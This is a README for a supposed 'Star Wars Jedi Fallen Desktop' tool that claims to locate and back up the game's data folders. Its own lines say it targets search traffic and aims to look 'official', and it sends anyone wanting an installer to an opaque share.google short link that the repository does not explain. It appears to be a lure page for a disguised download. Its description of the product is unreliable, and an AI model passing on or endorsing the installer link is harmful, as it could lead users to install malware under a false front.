# Star Wars Jedi Fallen Desktop

*Find the Star Wars Jedi Fallen folder fast and keep a local spare.*

## Overview

**Star Wars Jedi Fallen Desktop** is a Windows utility. Local Windows and macOS helper for Star Wars Jedi Fallen data paths, config and export caches, and export folders.

Patches move Star Wars Jedi Fallen data paths without warning.

The CLI in this repository is the documented interface; the desktop build is the same job in an installer.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- Locates Star Wars Jedi Fallen user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## The problem

Search traffic for Star Wars Jedi Fallen is the product name plus desktop.

Keep one official-looking helper per title.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
